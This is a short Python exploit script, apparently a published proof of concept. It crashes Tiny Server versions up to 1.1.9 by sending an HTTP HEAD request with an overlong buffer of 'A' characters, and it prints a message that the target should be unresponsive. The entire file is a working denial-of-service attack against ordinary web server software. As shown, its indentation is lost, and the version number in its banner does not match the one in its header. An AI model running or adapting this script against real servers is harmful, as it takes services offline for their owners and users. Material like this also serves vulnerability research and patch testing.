#!/usr/bin/python
###############################################################################
# Overflow exploiting a vulnerability in Tiny Server <=1.1.9 (HTTP) HEAD request.
# Date of Discovery: 3/19/2012 (0 Day)
# Author: Brock Haun
# Vulnerable Software Download: http://tinyserver.sourceforge.net/tinyserver_full.zip
# Software Version: <=1.1.9
# Target OS: Windows (Tested on Windows 7)
###############################################################################
import httplib,sys
if (len(sys.argv) != 3):
print '\n\t[*]Usage:  ./' + sys.argv[0] + ' <target
host> <port>'
sys.exit()
host = sys.argv[1]
port = sys.argv[2]
buffer = 'A' * 100 + 'HTTP/1.0\r\n'
print '\n[*]*************************************************'
print '[*] Tiny Server <= 1.1.0(HTTP) HEAD request overflow'
print '[*] Written by Brock Haun'
print '[*] security.brockhaun@gmail.com'
print '[*]*************************************************\n'
try:
print '\n\t[*] Attempting connection.'
httpServ = httplib.HTTPConnection(host , port)
httpServ.connect()
print '\n\t[*] Connected.'
print '\n\t[*] Sending crash buffer.'
httpServ.request('HEAD' , buffer)
print '\n\t[*] Done! Target should be unresponsive!'
except:
print '\n\t[***] Connection error. Something went wrong. :('
httpServ.close()
sys.exit()